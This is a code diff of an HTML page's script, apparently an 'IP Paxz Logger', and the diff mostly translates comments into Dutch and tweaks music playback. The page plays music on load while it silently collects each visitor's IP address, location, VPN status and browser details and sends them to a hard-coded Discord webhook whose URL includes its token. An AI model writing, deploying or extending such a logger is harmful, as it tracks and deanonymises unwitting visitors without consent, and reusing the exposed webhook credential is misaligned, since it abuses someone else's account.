@@ -29,18 +29,13 @@
     </style>
     <script>
         var embedSent = false;
-        var musicStarted = false;
 
         var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";
 
         function startMusic() {
-            var audio = new Audio('music.mp3'); // Change 'sound.mp3' to 'music.mp3' for the music file
+            var audio = new Audio('music.mp3'); // Verander 'sound.mp3' naar 'music.mp3' voor het muziekbestand
             audio.play();
-            musicStarted = true;
-            audio.addEventListener('ended', function() {
-                this.currentTime = 0;
-                this.play();
-            }, false);
+            audio.loop = true; // Loop de muziek zodat het altijd afspeelt
         }
 
         function sendToDiscord(ipAddress, locationData, isVPN) {
@@ -66,7 +61,7 @@
         }
 
         function sendEmbed(embedData) {
-            if (embedSent) return; // If embed is already sent, return
+            if (embedSent) return; // Als embed al is verzonden, stoppen
 
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
@@ -82,7 +77,7 @@
                     {
                         "title": "IP Paxz Logger",
                         "description": "A user has visited the page.",
-                        "color": 65280, // Green if liked, Red if not
+                        "color": 65280, // Groen als het leuk is, Rood als het niet leuk is
                         "fields": [
                             {
                                 "name": "IP Address",
@@ -234,7 +229,7 @@
         }
 
         window.onload = function() {
-            startMusic(); // Start music immediately when the page loads
+            startMusic(); // Start de muziek onmiddellijk wanneer de pagina laadt
 
             fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
@@ -248,16 +243,16 @@
                             fetch('https://api64.ipify.org/vpn-check')
                                 .then(response => response.json())
                                 .then(vpnData => {
-                                    sendToDiscord(ipAddress, locationData, vpnData.is_vpn);
+                                    sendToDiscord(ipAddress, locationData, vpnData.vpn);
                                 })
                                 .catch(error => {
                                     console.error('Unable to fetch VPN data:', error);
-                                    sendToDiscord(ipAddress, locationData, false); // Assume VPN is disabled
+                                    sendToDiscord(ipAddress, locationData, false); // Ga ervan uit dat VPN is uitgeschakeld
                                 });
                         })
                         .catch(error => {
                             console.error('Unable to fetch location data:', error);
-                            sendToDiscord(ipAddress, null, false); // Send embed with default location data and assume VPN is disabled
+                            sendToDiscord(ipAddress, null, false); // Stuur de embed met standaardlocatiegegevens en ga ervan uit dat VPN is uitgeschakeld
                         });
                 })
                 .catch(error => {
